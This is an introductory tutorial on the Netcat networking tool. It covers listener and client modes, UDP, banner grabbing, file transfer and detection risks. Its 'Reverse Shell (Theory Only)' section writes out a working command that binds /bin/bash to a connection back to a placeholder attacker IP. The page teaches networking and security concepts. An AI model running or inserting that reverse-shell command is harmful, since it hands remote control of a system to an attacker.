Netcat (nc)

Learn concepts first. Commands second. Execution later.

What is Netcat?

Netcat (nc) is a low-level networking utility that reads and writes data over TCP and UDP connections. It is often called the “Swiss Army knife of networking”.

  • Creates raw TCP/UDP connections
  • Works as client or listener
  • No encryption, no protocol parsing

Mental Model (Important)

Understanding Netcat becomes easy if you remember this flow: 

STDIN  →  Network Socket  →  STDOUT

Whatever you type is sent directly over the network. Whatever comes back is printed to your screen.

Client vs Listener Mode

Listener (waiting side)

nc -lvp 4444

Client (connecting side)

nc 127.0.0.1 4444

This mirrors real-world communication: one side waits, the other initiates.

TCP vs UDP

By default, Netcat uses TCP (reliable, ordered). You can also use UDP: 

nc -u host port

UDP does not guarantee delivery. Silence does not always mean “closed”.

Banner Grabbing

Banner grabbing is manually identifying services and versions. 

nc target.com 80

Then type:

GET / HTTP/1.1
Host: target.com

File Transfer (Concept)

Send a file

nc -lvp 4444 < file.txt

Receive a file

nc host 4444 > file.txt

This is simple but unsafe: no encryption, no integrity checks.

Reverse Shell (Theory Only)

A reverse shell makes the victim connect back to the attacker, bypassing inbound firewall rules. 

nc -e /bin/bash attacker_ip 4444

Most modern systems disable this option for security reasons.

Security Risks & Detection

  • Unencrypted traffic
  • Often flagged by IDS/IPS
  • Raw socket abuse
  • Common attacker ports (4444, 1337)

Netcat vs Nmap

Netcat is manual and raw. Nmap is automated and protocol-aware.

This is why Nmap is executed in this platform, while Netcat is taught conceptually.

Interview-Ready Summary

Netcat is a low-level networking tool used for manual interaction with TCP and UDP services. It is powerful for debugging and testing but dangerous if misused due to lack of encryption and authentication.
